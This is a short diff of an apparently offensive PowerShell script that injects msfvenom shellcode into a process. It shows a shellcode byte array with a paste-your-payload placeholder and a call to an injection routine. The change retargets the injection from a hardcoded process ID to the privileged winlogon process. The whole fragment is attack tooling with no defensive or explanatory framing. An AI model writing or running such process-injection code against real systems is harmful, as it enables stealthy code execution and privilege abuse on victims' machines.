@@ -55,7 +55,8 @@ Add-Type $code
 
 [byte[]]$sc = 0xfc,0x48,0x83,0xe4 # PASTE MSFVENOM SHELLCODE HERE
 
-$targetPid = 624 # REPLACE WITH TARGET PID
+$targetPid = (Get-Process winlogon).Id
+# $targetPid = 624 # REPLACE WITH TARGET PID
 Write-Host "[*] Target PID: $targetPid"
 [Inject]::Run($targetPid, $sc)
 
